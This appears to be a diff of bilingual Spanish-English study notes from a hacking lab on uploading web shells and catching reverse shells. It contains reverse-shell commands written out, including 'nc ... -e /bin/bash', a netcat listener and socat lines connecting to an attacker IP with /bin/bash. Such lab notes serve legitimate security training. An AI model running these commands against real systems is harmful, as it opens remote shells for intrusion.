@@ -24,11 +24,9 @@ To login using RDP:
 **PREGUNTA**
 
 ***Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.***
+¿Cómo subir y usar una webshell que ejecute `nc` para obtener una reverse shell?
 
 **RESPUESTA**
-
-**Pregunta:** ¿Cómo subir y usar una webshell que ejecute `nc` para obtener una reverse shell?
-**Respuesta:**
 
 1. Listener: `nc -lvnp <PUERTO>`
 2. Webshell PHP:
@@ -232,7 +230,6 @@ En máquina víctima (Linux objetivo), conectar:
 ```bash
 socat TCP:<IP_ATACANTE>:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
-
 ---
 
 ### 3. **Explicación de flags socat**
@@ -293,6 +290,8 @@ socat TCP:10.2.2.22:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ---
 
 Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.
+
+
 
 Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?
 
